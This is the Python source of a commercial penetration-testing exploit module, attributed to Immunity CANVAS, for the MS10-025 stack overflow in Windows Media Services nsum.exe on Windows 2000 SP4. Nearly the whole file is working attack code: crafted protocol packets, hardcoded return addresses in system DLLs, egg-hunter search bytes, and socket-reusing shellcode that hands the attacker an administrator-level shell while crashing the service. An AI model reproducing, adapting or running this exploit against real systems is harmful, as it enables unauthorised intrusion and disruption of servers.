#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import struct

if '.' not in sys.path:
    sys.path.append('.')

from exploitutils import *
from tcpexploit import tcpexploit
from MOSDEF import mosdef
from shellcode import shellcodeGenerator
import canvasengine

NAME='ms10_025'
DESCRIPTION='Windows Media Server nsum.exe stack overflow'

VERSION='1.0'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Date public']='04/13/2010'
DOCUMENTATION['References']=['http://www.microsoft.com/technet/security/bulletin/ms10-025.mspx']
DOCUMENTATION['Repeatability']='One-shot'
DOCUMENTATION['VersionsAffected']='Microsoft Media Services'
DOCUMENTATION['CVE Name']='CVE-2010-0478'
DOCUMENTATION['CVE URL']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2010-0478'
DOCUMENTATION['Notes']='''
This exploit will exploit vulnerable Windows 2000 servers - both with and without the buggy patch. 

It steals the socket so no listener is needed when using this exploit.

1) The service becomes irresponsive after the first exploit attempt. 
2) You'll end up in a Service account with administrator access. 
   This means you can't use screengrab from that thread.
3) You'll need to restart the service as part of your cleanup

You can restart it with net start "Windows Media Unicast Service"

This exploit supports both English and Simplified Chinese targets.

'''

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000']
PROPERTY['MSADV']='MS10-025'

CHANGELOG="""
"""

DEBUG_NOTES="""
If you're attached with Immunity Debugger, the GOCode takes longer than we wait
for it to send the G. If you see nsums.exe suddenly spawning threads then your 
shellcode is running.
"""

# PACKET TYPES
WMS_INIT       =0
WMS_FUNNL_START=1
WMS_FUNNL_END  =2

targets={
    0: ['Autoversioning N/A',0],
    1: ['Windows 2000 Server SP4 English', 0x750231e2], #in ws2help.dll - push esp/ret
    2: ['Windows 2000 Server SP4 Simplified Chinese', 0x74f5ee63] # msafd.dll (ws2help.dll didn't have any?)
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port=1755
        self.host=''
        self.version=0
        self.badstring='\r\n\0'
        self.searchbadstring='\r\n\0'
        self.rawshellcode=''
        self.name=NAME
        return

    def createShellcode(self):
        sc=shellcodeGenerator.win32()
        sc.addAttr("GOFindSock",None)
        sc.addAttr("RecvExecWin32",None)
        self.shellcode=sc.get()
        self.log("[!] Unencoded GOFindSock + RecvExecWin32 len: %d"%len(self.shellcode))
        return self.shellcode
        
    def testOS(self):
        """
        Tests for an OS we support on the remote target.
        """
        if self.version!=0:
            self.log('TestOS running with version %d?!?'%self.version)            
        self.version=0
        app=self.engine.getModuleExploit('osdetect')
        app.link(self)

        if app.run()==0:
            self.log('Unknown OS, automatic detection failed (try choosing a version)')
            return 0
        
        myos=app.result
        self.log('OS Found: %s'%(myos))
        if not myos.language:
            self.log('No language found, defaulting to engine\'s non-language option %s'%(self.engine.osdetect_mode))
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NO_RUN:
                self.log('Not running, could not find language')
                return 0
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_ONE_LANG:
                self.log('Assuming language %s'%(self.engine.osdetect_lang))
                myos.language=self.engine.osdetect_lang
            if self.engine.osdetect_mode==canvasengine.canvasengine.ASSUME_NEAREST_NEIGHBOR:
                self.log('Nearest neighbor algorithm not yet implemented')
                return 0
        if myos.base!='Windows':
            self.log('Cannot attack non Windows with this exploit')
            return 0
        if myos.version=='NT':
            self.log("This exploit does not target Windows NT 4.0")
            return 0
        elif myos.version=='2000':
            self.log("Found Windows 2000")
            return myos
        elif myos.version=='XP':
            self.log("This exploit does not target Windows XP")
            return 0
        elif myos.version=='2003':
            self.log("This exploit does not target Windows 2003")
            return 0
        else:
            self.log('OS not vulnerable: %s'%(myos))
        return 0

    def packetFragGen(self,type,payloadlen=0):
        pkt=""
        if type==WMS_INIT:  
            pkt+="\x01\x00\x00\x00\xce\xfa\x0b\xb0\xa0\x00\x00\x00\x4d\x4d\x53\x20"
            pkt+="\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            pkt+="\x12\x00\x00\x00\x01\x00\x03\x00\xf0\xf0\xf0\xf0\x0b\x00\x04\x00"
            pkt+="\x1c\x00\x03\x00\x4e\x00\x53\x00\x50\x00\x6c\x00\x61\x00\x79\x00"
            pkt+="\x65\x00\x72\x00\x2f\x00\x31\x00\x30\x00\x2e\x00\x30\x00\x2e\x00"
            pkt+="\x30\x00\x2e\x00\x33\x00\x36\x00\x34\x00\x36\x00\x3b\x00\x20\x00"
            pkt+="\x7b\x00\x33\x00\x33\x00\x30\x00\x30\x00\x41\x00\x44\x00\x35\x00"
            pkt+="\x30\x00\x2d\x00\x32\x00\x43\x00\x33\x00\x39\x00\x2d\x00\x34\x00"
            pkt+="\x36\x00\x63\x00\x30\x00\x2d\x00\x41\x00\x45\x00\x30\x00\x41\x00"
            pkt+="\x2d\x00\x42\x00\x41\x00\x33\x00\x45\x00\x45\x00\x30\x00\x43\x00"
            pkt+="\x38\x00\x31\x00\x33\x00\x36\x00\x45\x00\x7d\x00\x00\x00\x00\x00"
        elif type==WMS_FUNNL_START:
            pkt+="\x01\x00\x00\x00\xce\xfa\x0b\xb0"
            # len field
            pkt+=struct.pack("<L",(100-0x10)+payloadlen) # total payload len
            self.log("WMS_FUNNL_START len field set to: %d"%((100-0x10)+payloadlen))
            pkt+="\x4d\x4d\x53\x20"
            pkt+="\x00\x00\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            pkt+="\x78\x00\x00\x00\x02\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00"
            pkt+="\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x5c\x00"
            pkt+="\x33\x00\x5c\x00"
        elif type==WMS_FUNNL_END:
            pkt+="\x33\x00\x33\x00\x33\x00\x5c\x00\x33\x00\x33\x00\x33\x00\x33\x00"
            pkt+="\x33\x00\x33\x00\x33\x00\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        return pkt
    
    def buildKillPacket(self):
        payload=''
        search="\x8B\x01\x83\xE8\x02\x50\xC3"

        # 260 bytes for tag hit (this holds searchcode)
        payload+="\x90"*(68-len(search))+search

        # make ebx point to jmp $4 which jumps back to the full 260 bytes 
        payload+="\x90\x90"+mosdef.assemble("jmp $4","X86")
        # retadd (call ebx)
        description,retadd=targets[self.version]
        self.log("Target: %s (0x%08X)"%(description,retadd))
        payload+=struct.pack("<L",retadd)
        payload+="\x90"*0x14
        #payload+="\x33\xc0\xb0\x01\xc1\xe0\x10\x2b\xe0"
        # jmp back for the searchcode
        payload+=mosdef.assemble('jmp $-98','x86')

        # some BS code that to fill excess bytes and prevent our searchtags
        # from showing up twice, this isn't actually called
        DISAS2="""
 804953a:       b8 00 33 40 01          mov    $0x1403300,%eax
 804953f:       40                      inc    %eax
 8049540:       81 38 40 48 40 48       cmpl   $0x48404840,(%eax)
 8049546:       75 f7                   jne    804953f <str2+0x5>
 8049548:       50                      push   %eax
 8049549:       c3                      ret
        """
        payload+="\xb8\x00\x33\x40\x01\x40\x81\x38\x40\x48\x40\x48\x75\xf7\x50\xc3"

        # the search tags used in the searchcode
        payload+="\x53\x77\x61\x6E"+"\x90\x90\x90\x90"
        # main payload (doesn't end up in same as messed up thread)
        payload+=self.shellcode
        payload+="\x90"*192

        #payload = 'A' * 0x90
        pkt=self.packetFragGen(WMS_FUNNL_START,len(payload))
        pkt+=payload
        pkt+=self.packetFragGen(WMS_FUNNL_END)

        self.log("pkt len: %d"%len(pkt))
        return pkt
       
    def neededListenerTypes(self):
        return []

    def test(self):
        self.getArgs()
        ret = self.testOS()
        if not ret:
            return 0
        targetLang={"Simplified Chinese": 2, "English": 1}
        self.version = targetLang.get(ret.language,0)
        if self.version:
            self.log("Targeting version: %s"%self.version)
            return 1
        self.log("Can not target that language(%s) yet!"%ret.language)
        return 0

    def getArgs(self):
        self.host=self.target.interface
        self.getarg("port")
        self.socknode=self.argsDict["passednodes"][0]
        return 
        
    def run(self):
        self.getArgs()

        s=self.gettcpsock()
        try:	
            s.connect((self.host,self.port))
        except:
            self.log("Failed to connnect")
            self.setInfo("%s: Failed to connect to port %s against host %s"%(self.name, self.port, self.host))
            return 0
        
        if self.version==0:
            self.test()
            if self.version == 0:
                self.log("Could not auto-target against that host!")
                self.setInfo("%s: Failed to auto-target against host %s"%(self.name,self.host))
                return 0

        self.setInfo("%s Running against %s:%d"%(self.name,self.host,self.port))

        self.log("Sending WMS_INIT")
        s.send(self.packetFragGen(WMS_INIT))
        rsp=s.recv(256)
        # go for the kill
        self.log("Sending Exploit packet")
        s.send(self.buildKillPacket())

        # do trigger stuff
        ret=self.checkTriggerWin32(s)
        if not ret:
            # 4 times total, createthreadcode can be slow :/
            ret=self.checkTriggerWin32(s)
        if ret:
            from win32Node import win32Node
            import win32MosdefShellServer
            self.log("Got trigger!")
            node=win32Node()
            node.parentnode=self.argsDict["passednodes"][0]
            newshell=win32MosdefShellServer.win32shellserver(s,node,self.logfunction)
            newshell.node.startup()
            self.setInfo("%s attacking %s:%d - (succeeded!)"%(NAME,self.host,self.port),showlog=1)
            self.log("Thanks \\0/")
            return newshell.node
        else:
            self.log("No trigger for win32...failed to call GOcode?")
            self.setInfo("%s attacking %s:%d - (failed!)"%(NAME,self.host,self.port),showlog=1)
            return 0

        return 1
 
    def displayVersions(self):
        i=0
        for listline in targets.values():
            print "%d: %s"%(i,listline[0])
            i=i+1 
        sys.exit(0)

if __name__=='__main__':
        print "Running CANVAS "+NAME+" version "+VERSION
        app=theexploit()
        ret=standard_callback_commandline(app)
        if ret not in [0,1,None]:
            ret.interact()
